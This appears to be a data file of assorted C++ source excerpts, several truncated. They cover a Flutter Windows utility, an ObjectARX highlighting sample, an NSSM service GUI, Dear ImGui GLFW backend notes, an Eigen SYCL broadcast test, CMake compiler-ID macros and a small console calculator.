    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "//////////////////////////////////////////////////////////////////////////////\n//\n//  Copyright 2023 Autodesk, Inc.  All rights reserved.\n//\n//  Use of this software is subject to the terms of the Autodesk license \n//  agreement provided at the time of installation or download, or which \n//  otherwise accompanies this software in either electronic or hard copy form.   \n//\n//////////////////////////////////////////////////////////////////////////////\n//\n// HILIT.CPP \n//\n// DESCRIPTION:\n//\n// This file contains the sample code exercising the highlight\n// methods.\n\n\n#if defined(_DEBUG) && !defined(AC_FULL_DEBUG)\n#error _DEBUG should not be defined except in internal Adesk debug builds\n#endif\n\n#include \"adslib.h\"\n#include \"dbents.h\"\n#include \"dbsol3d.h\"\n\n#include \"gepnt3d.h\"\n\n#include \"poly.h\"\n#include \"util.h\"\n#include \"tchar.h\"\n\n#include \"acedCmdNF.h\"\n\n\n// Static functions used in this file\n//\nstatic int extractEntityInfo(struct resbuf *rb,\n                             int&           sel_method,\n                             ads_name       ename,\n                             ads_name       subname,\n                             short&         marker,\n                             AcGePoint3d&   pickpnt,\n                             AcGeVector3d&  pickvec);\n\nstatic void pressEnterToContinue();\n\nvoid \nhilitPoly()\n{\n    acutPrintf(_T(\"\\nSelect a poly\"));\n\n    AsdkPoly    *poly = NULL;\n    AcDbEntity  *ent = NULL;\n    AcDbObjectId polyId;\n    ads_name     ename, sset;\n\n    for (;;) {\n\n        switch (acedSSGet(NULL, NULL, NULL, NULL, sset)) {\n\n        case RTNORM:\n\n        // Get the poly from the selection set and do some subentity\n        // highlighting testing.\n        //\n        // This code assumes that the user selected only one item.\n\n        {\n            struct resbuf *rb;\n            if (acedSSNameX(&rb, sset, 0) != RTNORM) {\n                acedSSFree(sset);\n                return;\n            }\n            int            sel_method;\n            ads_name       subname;\n            short          marker;\n            AcGePoint3d    pickpnt;\n            AcGeVector3d   pickvec;\n\n            if (!extractEntityInfo(rb,\n                              sel_method,\n                              ename,\n                              subname,\n                              marker,\n                              pickpnt,\n                              pickvec)) {\n                acedSSFree(sset);\n                return;\n            }\n\n            acdbGetObjectId(polyId, ename);\n\t\t\tif ( acdbOpenAcDbEntity(ent, polyId, AcDb::kForRead) != Acad::eOk )\n\t\t\t\tcontinue;\n            assert(ent != NULL);\n\n            poly = AsdkPoly::cast(ent);\n            if (poly == NULL) {\n                acutPrintf(_T(\"\\nNot a polygon.\"));\n\t\t\t\tent->close();\n                acedSSFree(sset);\n                continue;\n            }\n\n            // Get the subentity and highlight it.\n\n            int                  numPaths;\n            AcDbFullSubentPath*  subentPaths;\n            AcGeMatrix3d         xform;\n            if(Acad::eOk != poly->getSubentPathsAtGsMarker( AcDb::kEdgeSubentType,\n                                            marker,\n                                            pickpnt,\n                                            xform,\n                                            numPaths,\n                                            subentPaths))\n            {\n                acutPrintf(_T(\"\\nError obtaining Subentity Path from AsdkPoly object.\"));\n\t\t\t\tent->close();\n                acedSSFree(sset);\n                continue;\n            }\n            if(numPaths == 1)\n            {\n                // Highlight and unhighlight the subentity.\n                //\n                acutPrintf(_T(\"\\nHighlighting the subentity\"));\n                poly->highlight(subentPaths[0]);\n                pressEnterToContinue();\n                poly->unhighlight(subentPaths[0]);\n            }\n            else\n            {\n                // No path, user selected a section without a marker,\n                // the text label for example\n                //\n                acutPrintf(_T(\"\\nNo subentity to highlight\"));\n            }\n\n            // Highlight and unhighlight the whole entity.\n            //\n            acutPrintf(_T(\"\\nHighlighting the whole entity\"));\n            poly->highlight();\n            pressEnterToContinue();\n            poly->unhighlight();\n\n            delete []subentPaths;\n            acedSSFree(sset);\n        }\n        break;\n\n        case RTNONE:\n        case RTCAN:\n            return;\n        default:\n            continue;\n        }\n        acedSSFree(sset);\n        break;\n    }\n    ent->close();\n    return;\n}\n \nvoid \nhilitSolid()\n{\n    acutPrintf(_T(\"\\nSelect a solid\"));\n\n    Acad::ErrorStatus es = Acad::eOk;\n\n    AcDb3dSolid *solid = NULL;\n    AcDbEntity  *ent = NULL;\n    AcDbObjectId solidId;\n    ads_name     ename, sset;\n\n    for (;;) {\n\n        switch (acedSSGet(NULL, NULL, NULL, NULL, sset)) {\n\n        case RTNORM:\n        {",
    "#include \"nssm.h\"\r\n\r\nextern const TCHAR *hook_event_strings[];\r\nextern const TCHAR *hook_action_strings[];\r\n\r\nstatic enum { NSSM_TAB_APPLICATION, NSSM_TAB_DETAILS, NSSM_TAB_LOGON, NSSM_TAB_DEPENDENCIES, NSSM_TAB_PROCESS, NSSM_TAB_SHUTDOWN, NSSM_TAB_EXIT, NSSM_TAB_IO, NSSM_TAB_ROTATION, NSSM_TAB_ENVIRONMENT, NSSM_TAB_HOOKS, NSSM_NUM_TABS } nssm_tabs;\r\nstatic HWND tablist[NSSM_NUM_TABS];\r\nstatic int selected_tab;\r\n\r\nstatic HWND dialog(const TCHAR *templ, HWND parent, DLGPROC function, LPARAM l) {\r\n  /* The caller will deal with GetLastError()... */\r\n  HRSRC resource = FindResourceEx(0, RT_DIALOG, templ, GetUserDefaultLangID());\r\n  if (! resource) {\r\n    if (GetLastError() != ERROR_RESOURCE_LANG_NOT_FOUND) return 0;\r\n    resource = FindResourceEx(0, RT_DIALOG, templ, MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL));\r\n    if (! resource) return 0;\r\n  }\r\n\r\n  HGLOBAL ret = LoadResource(0, resource);\r\n  if (! ret) return 0;\r\n\r\n  return CreateDialogIndirectParam(0, (DLGTEMPLATE *) ret, parent, function, l);\r\n}\r\n\r\nstatic HWND dialog(const TCHAR *templ, HWND parent, DLGPROC function) {\r\n  return dialog(templ, parent, function, 0);\r\n}\r\n\r\nstatic inline void set_logon_enabled(unsigned char interact_enabled, unsigned char credentials_enabled) {\r\n  EnableWindow(GetDlgItem(tablist[NSSM_TAB_LOGON], IDC_INTERACT), interact_enabled);\r\n  EnableWindow(GetDlgItem(tablist[NSSM_TAB_LOGON], IDC_USERNAME), credentials_enabled);\r\n  EnableWindow(GetDlgItem(tablist[NSSM_TAB_LOGON], IDC_PASSWORD1), credentials_enabled);\r\n  EnableWindow(GetDlgItem(tablist[NSSM_TAB_LOGON], IDC_PASSWORD2), credentials_enabled);\r\n}\r\n\r\nint nssm_gui(int resource, nssm_service_t *service) {\r\n  /* Create window */\r\n  HWND dlg = dialog(MAKEINTRESOURCE(resource), 0, nssm_dlg, (LPARAM) service);\r\n  if (! dlg) {\r\n    popup_message(0, MB_OK, NSSM_GUI_CREATEDIALOG_FAILED, error_string(GetLastError()));\r\n    return 1;\r\n  }\r\n\r\n  /* Load the icon. */\r\n  HANDLE icon = LoadImage(GetModuleHandle(0), MAKEINTRESOURCE(IDI_NSSM), IMAGE_ICON, GetSystemMetrics(SM_CXSMICON), GetSystemMetrics(SM_CYSMICON), 0);\r\n  if (icon) SendMessage(dlg, WM_SETICON, ICON_SMALL, (LPARAM) icon);\r\n  icon = LoadImage(GetModuleHandle(0), MAKEINTRESOURCE(IDI_NSSM), IMAGE_ICON, GetSystemMetrics(SM_CXICON), GetSystemMetrics(SM_CYICON), 0);\r\n  if (icon) SendMessage(dlg, WM_SETICON, ICON_BIG, (LPARAM) icon);\r\n\r\n  /* Remember what the window is for. */\r\n  SetWindowLongPtr(dlg, GWLP_USERDATA, (LONG_PTR) resource);\r\n\r\n  /* Display the window */\r\n  centre_window(dlg);\r\n  ShowWindow(dlg, SW_SHOW);\r\n\r\n  /* Set service name if given */\r\n  if (service->name[0]) {\r\n    SetDlgItemText(dlg, IDC_NAME, service->name);\r\n    /* No point making user click remove if the name is already entered */\r\n    if (resource == IDD_REMOVE) {\r\n      HWND button = GetDlgItem(dlg, IDC_REMOVE);\r\n      if (button) {\r\n        SendMessage(button, WM_LBUTTONDOWN, 0, 0);\r\n        SendMessage(button, WM_LBUTTONUP, 0, 0);\r\n      }\r\n    }\r\n  }\r\n\r\n  if (resource == IDD_EDIT) {\r\n    /* We'll need the service handle later. */\r\n    SetWindowLongPtr(dlg, DWLP_USER, (LONG_PTR) service);\r\n\r\n    /* Service name can't be edited. */\r\n    EnableWindow(GetDlgItem(dlg, IDC_NAME), 0);\r\n    SetFocus(GetDlgItem(dlg, IDOK));\r\n\r\n    /* Set existing details. */\r\n    HWND combo;\r\n    HWND list;\r\n\r\n    /* Application tab. */\r\n    if (service->native) SetDlgItemText(tablist[NSSM_TAB_APPLICATION], IDC_PATH, service->image);\r\n    else SetDlgItemText(tablist[NSSM_TAB_APPLICATION], IDC_PATH, service->exe);\r\n    SetDlgItemText(tablist[NSSM_TAB_APPLICATION], IDC_DIR, service->dir);\r\n    SetDlgItemText(tablist[NSSM_TAB_APPLICATION], IDC_FLAGS, service->flags);\r\n\r\n    /* Details tab. */\r\n    SetDlgItemText(tablist[NSSM_TAB_DETAILS], IDC_DISPLAYNAME, service->displayname);\r\n    SetDlgItemText(tablist[NSSM_TAB_DETAILS], IDC_DESCRIPTION, service->description);\r\n    combo = GetDlgItem(tablist[NSSM_TAB_DETAILS], IDC_STARTUP);\r\n    SendMessage(combo, CB_SETCURSEL, service->startup, 0);\r\n\r\n    /* Log on tab. */\r\n    if (service->username) {\r\n      if (is_virtual_account(service->name, service->username)) {\r\n        CheckRadioButton(tablist[NSSM_TAB_LOGON], IDC_LOCALSYSTEM, IDC_VIRTUAL_SERVICE, IDC_VIRTUAL_SERVICE);\r\n        set_logon_enabled(0, 0);\r\n      }\r\n      else {\r\n        CheckRadioButton(tablist[NSSM_TAB_LOGON], IDC_LOCALSYSTEM, IDC_VIRTUAL_SERVICE, IDC_ACCOUNT);\r\n        SetDlgItemText(tablist[NSSM_TAB_LOGON], IDC_USERNAME, service->username);\r\n        set_logon_enabled(0, 1);\r\n      }\r\n    }\r\n    else {\r\n      CheckRadioButton(tablist[NSSM_TAB_LOGON], IDC_LOCALSYSTEM, IDC_VIRTUAL_SERVICE, IDC_LOCALSYSTEM);\r\n      if (service->type & SERVICE_INTERACTIVE_PROCESS) SendDlgItemMessage(tablist[NSSM_TAB_LOGON], IDC_INTERACT, BM_SETCHECK, BST_CHECKED, 0);\r\n    }\r\n\r\n    /* Dependencies tab. */\r\n    if (service->dependencieslen) {\r\n      TCHAR *formatted;\r\n      unsigned long newlen;\r\n      if (format_double_null(service->dependencies, service->dependencieslen, &formatted, &newlen)) {\r",
    "// dear imgui: Platform Backend for GLFW\n// This needs to be used along with a Renderer (e.g. OpenGL3, Vulkan, WebGPU..)\n// (Info: GLFW is a cross-platform general purpose library for handling windows, inputs, OpenGL/Vulkan graphics context creation, etc.)\n// (Requires: GLFW 3.1+. Prefer GLFW 3.3+ or GLFW 3.4+ for full feature support.)\n\n// Implemented features:\n//  [X] Platform: Clipboard support.\n//  [X] Platform: Keyboard support. Since 1.87 we are using the io.AddKeyEvent() function. Pass ImGuiKey values to all key functions e.g. ImGui::IsKeyPressed(ImGuiKey_Space). [Legacy GLFW_KEY_* values will also be supported unless IMGUI_DISABLE_OBSOLETE_KEYIO is set]\n//  [X] Platform: Gamepad support. Enable with 'io.ConfigFlags |= ImGuiConfigFlags_NavEnableGamepad'.\n//  [X] Platform: Mouse cursor shape and visibility. Disable with 'io.ConfigFlags |= ImGuiConfigFlags_NoMouseCursorChange' (note: the resizing cursors requires GLFW 3.4+).\n//  [X] Platform: Multi-viewport support (multiple windows). Enable with 'io.ConfigFlags |= ImGuiConfigFlags_ViewportsEnable'.\n\n// Issues:\n//  [ ] Platform: Multi-viewport support: ParentViewportID not honored, and so io.ConfigViewportsNoDefaultParent has no effect (minor).\n\n// You can use unmodified imgui_impl_* files in your project. See examples/ folder for examples of using this.\n// Prefer including the entire imgui/ repository into your project (either as a copy or as a submodule), and only build the backends you need.\n// If you are new to Dear ImGui, read documentation from the docs/ folder + read the top of imgui.cpp.\n// Read online: https://github.com/ocornut/imgui/tree/master/docs\n\n// CHANGELOG\n// (minor and older changes stripped away, please see git history for details)\n//  2023-XX-XX: Platform: Added support for multiple windows via the ImGuiPlatformIO interface.\n//  2023-03-16: Inputs: Fixed key modifiers handling on secondary viewports (docking branch). Broken on 2023/01/04. (#6248, #6034)\n//  2023-03-14: Emscripten: Avoid using glfwGetError() and glfwGetGamepadState() which are not correctly implemented in Emscripten emulation. (#6240)\n//  2023-02-03: Emscripten: Registering custom low-level mouse wheel handler to get more accurate scrolling impulses on Emscripten. (#4019, #6096)\n//  2023-01-18: Handle unsupported glfwGetVideoMode() call on e.g. Emscripten.\n//  2023-01-04: Inputs: Fixed mods state on Linux when using Alt-GR text input (e.g. German keyboard layout), could lead to broken text input. Revert a 2022/01/17 change were we resumed using mods provided by GLFW, turns out they were faulty.\n//  2022-11-22: Perform a dummy glfwGetError() read to cancel missing names with glfwGetKeyName(). (#5908)\n//  2022-10-18: Perform a dummy glfwGetError() read to cancel missing mouse cursors errors. Using GLFW_VERSION_COMBINED directly. (#5785)\n//  2022-10-11: Using 'nullptr' instead of 'NULL' as per our switch to C++11.\n//  2022-09-26: Inputs: Renamed ImGuiKey_ModXXX introduced in 1.87 to ImGuiMod_XXX (old names still supported).\n//  2022-09-01: Inputs: Honor GLFW_CURSOR_DISABLED by not setting mouse position.\n//  2022-04-30: Inputs: Fixed ImGui_ImplGlfw_TranslateUntranslatedKey() for lower case letters on OSX.\n//  2022-03-23: Inputs: Fixed a regression in 1.87 which resulted in keyboard modifiers events being reported incorrectly on Linux/X11.\n//  2022-02-07: Added ImGui_ImplGlfw_InstallCallbacks()/ImGui_ImplGlfw_RestoreCallbacks() helpers to facilitate user installing callbacks after initializing backend.\n//  2022-01-26: Inputs: replaced short-lived io.AddKeyModsEvent() (added two weeks ago) with io.AddKeyEvent() using ImGuiKey_ModXXX flags. Sorry for the confusion.\n//  2021-01-20: Inputs: calling new io.AddKeyAnalogEvent() for gamepad support, instead of writing directly to io.NavInputs[].\n//  2022-01-17: Inputs: calling new io.AddMousePosEvent(), io.AddMouseButtonEvent(), io.AddMouseWheelEvent() API (1.87+).\n//  2022-01-17: Inputs: always update key mods next and before key event (not in NewFrame) to fix input queue with very low framerates.\n//  2022-01-12: *BREAKING CHANGE*: Now using glfwSetCursorPosCallback(). If you called ImGui_ImplGlfw_InitXXX() with install_callbacks = false, you MUST install glfwSetCursorPosCallback() and forward it to the backend via ImGui_ImplGlfw_CursorPosCallback().\n//  2022-01-10: Inputs: calling new io.AddKeyEvent(), io.AddKeyModsEvent() + io.SetKeyEventNativeData() API (1.87+). Support for full ImGuiKey range.\n//  2022-01-05: Inputs: Converting GLFW untranslated keycodes back to translated keycodes (in the ImGui_ImplGlfw_KeyCallback() function) in order to match the behavior of every other backend, and facilitate the use of GLFW with lettered-shortcuts API.\n//  2021-08-17: *BREAKING CHANGE*: Now using glfwSetWindowFocusCallback() to calling io.AddFocusEvent(). If you called ImGui_ImplGlfw_InitXXX() with install_callbacks = false, you MUST install glfwSetWindowFocusCallback() and forward it to the backend via ImGui_ImplGlfw_WindowFocusCallb",
    "// This file is part of Eigen, a lightweight C++ template library\n// for linear algebra.\n//\n// Copyright (C) 2016\n// Mehdi Goli    Codeplay Software Ltd.\n// Ralph Potter  Codeplay Software Ltd.\n// Luke Iwanski  Codeplay Software Ltd.\n// Contact: <eigen@codeplay.com>\n//\n// This Source Code Form is subject to the terms of the Mozilla\n// Public License v. 2.0. If a copy of the MPL was not distributed\n// with this file, You can obtain one at http://mozilla.org/MPL/2.0/.\n\n#define EIGEN_TEST_NO_LONGDOUBLE\n#define EIGEN_TEST_NO_COMPLEX\n\n#define EIGEN_DEFAULT_DENSE_INDEX_TYPE int64_t\n#define EIGEN_USE_SYCL\n\n#include \"main.h\"\n#include <unsupported/Eigen/CXX11/Tensor>\n\nusing Eigen::array;\nusing Eigen::SyclDevice;\nusing Eigen::Tensor;\nusing Eigen::TensorMap;\n\ntemplate <typename DataType, int DataLayout, typename IndexType>\nstatic void test_broadcast_sycl_fixed(const Eigen::SyclDevice &sycl_device){\n\n  // BROADCAST test:\n  IndexType inDim1=2;\n  IndexType inDim2=3;\n  IndexType inDim3=5;\n  IndexType inDim4=7;\n  IndexType bDim1=2;\n  IndexType bDim2=3;\n  IndexType bDim3=1;\n  IndexType bDim4=4;\n  array<IndexType, 4> in_range   = {{inDim1, inDim2, inDim3, inDim4}};\n  array<IndexType, 4> broadcasts = {{bDim1, bDim2, bDim3, bDim4}};\n  array<IndexType, 4> out_range;  // = in_range * broadcasts\n  for (size_t i = 0; i < out_range.size(); ++i)\n    out_range[i] = in_range[i] * broadcasts[i];\n\n  Tensor<DataType, 4, DataLayout, IndexType>  input(in_range);\n  Tensor<DataType, 4, DataLayout, IndexType> out(out_range);\n\n  for (size_t i = 0; i < in_range.size(); ++i)\n    VERIFY_IS_EQUAL(out.dimension(i), out_range[i]);\n\n\n  for (IndexType i = 0; i < input.size(); ++i)\n    input(i) = static_cast<DataType>(i);\n\n  DataType * gpu_in_data  = static_cast<DataType*>(sycl_device.allocate(input.dimensions().TotalSize()*sizeof(DataType)));\n  DataType * gpu_out_data  = static_cast<DataType*>(sycl_device.allocate(out.dimensions().TotalSize()*sizeof(DataType)));\n\n  TensorMap<TensorFixedSize<DataType, Sizes<2, 3, 5, 7>, DataLayout, IndexType>> gpu_in(gpu_in_data, in_range);\n  TensorMap<Tensor<DataType, 4, DataLayout, IndexType>> gpu_out(gpu_out_data, out_range);\n  sycl_device.memcpyHostToDevice(gpu_in_data, input.data(),(input.dimensions().TotalSize())*sizeof(DataType));\n  gpu_out.device(sycl_device) = gpu_in.broadcast(broadcasts);\n  sycl_device.memcpyDeviceToHost(out.data(), gpu_out_data,(out.dimensions().TotalSize())*sizeof(DataType));\n\n  for (IndexType i = 0; i < inDim1*bDim1; ++i) {\n    for (IndexType j = 0; j < inDim2*bDim2; ++j) {\n      for (IndexType k = 0; k < inDim3*bDim3; ++k) {\n        for (IndexType l = 0; l < inDim4*bDim4; ++l) {\n          VERIFY_IS_APPROX(input(i%2,j%3,k%5,l%7), out(i,j,k,l));\n        }\n      }\n    }\n  }\n  printf(\"Broadcast Test with fixed size Passed\\n\");\n  sycl_device.deallocate(gpu_in_data);\n  sycl_device.deallocate(gpu_out_data);\n}\n\ntemplate <typename DataType, int DataLayout, typename IndexType>\nstatic void test_broadcast_sycl(const Eigen::SyclDevice &sycl_device){\n\n  // BROADCAST test:\n  IndexType inDim1=2;\n  IndexType inDim2=3;\n  IndexType inDim3=5;\n  IndexType inDim4=7;\n  IndexType bDim1=2;\n  IndexType bDim2=3;\n  IndexType bDim3=1;\n  IndexType bDim4=4;\n  array<IndexType, 4> in_range   = {{inDim1, inDim2, inDim3, inDim4}};\n  array<IndexType, 4> broadcasts = {{bDim1, bDim2, bDim3, bDim4}};\n  array<IndexType, 4> out_range;  // = in_range * broadcasts\n  for (size_t i = 0; i < out_range.size(); ++i)\n    out_range[i] = in_range[i] * broadcasts[i];\n\n  Tensor<DataType, 4, DataLayout, IndexType>  input(in_range);\n  Tensor<DataType, 4, DataLayout, IndexType> out(out_range);\n\n  for (size_t i = 0; i < in_range.size(); ++i)\n    VERIFY_IS_EQUAL(out.dimension(i), out_range[i]);\n\n\n  for (IndexType i = 0; i < input.size(); ++i)\n    input(i) = static_cast<DataType>(i);\n\n  DataType * gpu_in_data  = static_cast<DataType*>(sycl_device.allocate(input.dimensions().TotalSize()*sizeof(DataType)));\n  DataType * gpu_out_data  = static_cast<DataType*>(sycl_device.allocate(out.dimensions().TotalSize()*sizeof(DataType)));\n\n  TensorMap<Tensor<DataType, 4, DataLayout, IndexType>>  gpu_in(gpu_in_data, in_range);\n  TensorMap<Tensor<DataType, 4, DataLayout, IndexType>> gpu_out(gpu_out_data, out_range);\n  sycl_device.memcpyHostToDevice(gpu_in_data, input.data(),(input.dimensions().TotalSize())*sizeof(DataType));\n  gpu_out.device(sycl_device) = gpu_in.broadcast(broadcasts);\n  sycl_device.memcpyDeviceToHost(out.data(), gpu_out_data,(out.dimensions().TotalSize())*sizeof(DataType));\n\n  for (IndexType i = 0; i < inDim1*bDim1; ++i) {\n    for (IndexType j = 0; j < inDim2*bDim2; ++j) {\n      for (IndexType k = 0; k < inDim3*bDim3; ++k) {\n        for (IndexType l = 0; l < inDim4*bDim4; ++l) {\n          VERIFY_IS_APPROX(input(i%inDim1,j%inDim2,k%inDim3,l%inDim4), out(i,j,k,l));\n        }\n      }\n    }\n  }\n  printf(\"Broadcast Test Passed\\n\");\n  sycl_device.deallocate(gpu_in_data);\n  sycl_device.deallocate(gpu_out_data);\n}\n\ntemplate<typename DataType> void sycl",
    "/* This source file must have a .cpp extension so that all C++ compilers\n   recognize the extension without flags.  Borland does not know .cxx for\n   example.  */\n#ifndef __cplusplus\n# error \"A C compiler has been selected for C++.\"\n#endif\n\n#if !defined(__has_include)\n/* If the compiler does not have __has_include, pretend the answer is\n   always no.  */\n#  define __has_include(x) 0\n#endif\n\n\n/* Version number components: V=Version, R=Revision, P=Patch\n   Version date components:   YYYY=Year, MM=Month,   DD=Day  */\n\n#if defined(__COMO__)\n# define COMPILER_ID \"Comeau\"\n  /* __COMO_VERSION__ = VRR */\n# define COMPILER_VERSION_MAJOR DEC(__COMO_VERSION__ / 100)\n# define COMPILER_VERSION_MINOR DEC(__COMO_VERSION__ % 100)\n\n#elif defined(__INTEL_COMPILER) || defined(__ICC)\n# define COMPILER_ID \"Intel\"\n# if defined(_MSC_VER)\n#  define SIMULATE_ID \"MSVC\"\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_ID \"GNU\"\n# endif\n  /* __INTEL_COMPILER = VRP prior to 2021, and then VVVV for 2021 and later,\n     except that a few beta releases use the old format with V=2021.  */\n# if __INTEL_COMPILER < 2021 || __INTEL_COMPILER == 202110 || __INTEL_COMPILER == 202111\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER/100)\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER/10 % 10)\n#  if defined(__INTEL_COMPILER_UPDATE)\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER_UPDATE)\n#  else\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER   % 10)\n#  endif\n# else\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER)\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER_UPDATE)\n   /* The third version component from --version is an update index,\n      but no macro is provided for it.  */\n#  define COMPILER_VERSION_PATCH DEC(0)\n# endif\n# if defined(__INTEL_COMPILER_BUILD_DATE)\n   /* __INTEL_COMPILER_BUILD_DATE = YYYYMMDD */\n#  define COMPILER_VERSION_TWEAK DEC(__INTEL_COMPILER_BUILD_DATE)\n# endif\n# if defined(_MSC_VER)\n   /* _MSC_VER = VVRR */\n#  define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n#  define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n# elif defined(__GNUG__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n# endif\n# if defined(__GNUC_MINOR__)\n#  define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n# endif\n# if defined(__GNUC_PATCHLEVEL__)\n#  define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n# endif\n\n#elif (defined(__clang__) && defined(__INTEL_CLANG_COMPILER)) || defined(__INTEL_LLVM_COMPILER)\n# define COMPILER_ID \"IntelLLVM\"\n#if defined(_MSC_VER)\n# define SIMULATE_ID \"MSVC\"\n#endif\n#if defined(__GNUC__)\n# define SIMULATE_ID \"GNU\"\n#endif\n/* __INTEL_LLVM_COMPILER = VVVVRP prior to 2021.2.0, VVVVRRPP for 2021.2.0 and\n * later.  Look for 6 digit vs. 8 digit version number to decide encoding.\n * VVVV is no smaller than the current year when a version is released.\n */\n#if __INTEL_LLVM_COMPILER < 1000000L\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/100)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/10 % 10)\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER    % 10)\n#else\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/10000)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/100 % 100)\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER     % 100)\n#endif\n#if defined(_MSC_VER)\n  /* _MSC_VER = VVRR */\n# define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n# define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n#endif\n#if defined(__GNUC__)\n# define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n#elif defined(__GNUG__)\n# define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n#endif\n#if defined(__GNUC_MINOR__)\n# define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n#endif\n#if defined(__GNUC_PATCHLEVEL__)\n# define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n#endif\n\n#elif defined(__PATHCC__)\n# define COMPILER_ID \"PathScale\"\n# define COMPILER_VERSION_MAJOR DEC(__PATHCC__)\n# define COMPILER_VERSION_MINOR DEC(__PATHCC_MINOR__)\n# if defined(__PATHCC_PATCHLEVEL__)\n#  define COMPILER_VERSION_PATCH DEC(__PATHCC_PATCHLEVEL__)\n# endif\n\n#elif defined(__BORLANDC__) && defined(__CODEGEARC_VERSION__)\n# define COMPILER_ID \"Embarcadero\"\n# define COMPILER_VERSION_MAJOR HEX(__CODEGEARC_VERSION__>>24 & 0x00FF)\n# define COMPILER_VERSION_MINOR HEX(__CODEGEARC_VERSION__>>16 & 0x00FF)\n# define COMPILER_VERSION_PATCH DEC(__CODEGEARC_VERSION__     & 0xFFFF)\n\n#elif defined(__BORLANDC__)\n# define COMPILER_ID \"Borland\"\n  /* __BORLANDC__ = 0xVRR */\n# define COMPILER_VERSION_MAJOR HEX(__BORLANDC__>>8)\n# define COMPILER_VERSION_MINOR HEX(__BORLANDC__ & 0xFF)\n\n#elif defined(__WATCOMC__) && __WATCOMC__ < 1200\n# define COMPILER_ID \"Watcom\"\n   /* __WATCOMC__ = VVRR */\n# define COMPILER_VERSION_MAJOR DEC(__WATCOMC__ / 100)\n# define COMPILER_VERSION_MINOR DEC((__WATCOMC__ / 10) % 10)\n# if (__WATCOMC__ % 10) > 0\n#  define COMPILER_VERSION_PATCH DEC(__WATCOMC__ % 10)\n# endif\n\n#elif defined(__WATCOMC__)\n# define COMPILER_ID \"OpenWatcom\"\n   /* __WATCOMC__ =",
    "#include<iostream>\n\nusing namespace std;\n\nint main()\n{\n    double num1, num2;\n    char operation;\n  \n    cout << \"Enter the First Number: \";\n    cin >> num1;\n    cout << \"Enter the Second Number: \";\n    cin >> num2;\n\n    cout << \"Choose an operation (+, -, *, /, %): \";\n    cin >> operation;\n\n    switch (operation)\n    {\n        case '+':\n            cout << \"Result: \" << ( num1 + num2 ) << endl;\n            break;\n      \n        case '-':\n            cout << \"Result: \" << ( num1 - num2 ) << endl;\n            break;\n      \n        case '*':\n            cout << \"Result: \" << ( num1 * num2 ) << endl;\n            break;\n      \n        case '/':\n            if( num2 == 0 ) \n            {\n                cout << \"Error: Division by zero is undefined\" << endl;\n            } \n            \n            else \n            {\n                cout << \"Result: \" << (num1 / num2) << endl;\n            }\n            break;\n      \n        case '%':\n            if( num2 == 0 )\n            {\n                cout << \"Error: Division by zero is undefined\" << endl;  \n            }\n\n            else\n            {\n                cout << \"Result: \" << (num1 % num2) << endl;\n            }\n            break;\n      \n        default:\n            cout << \"Please choose a valid operation!\" << endl;\n    }\n\n    return 0;    \n}\n",
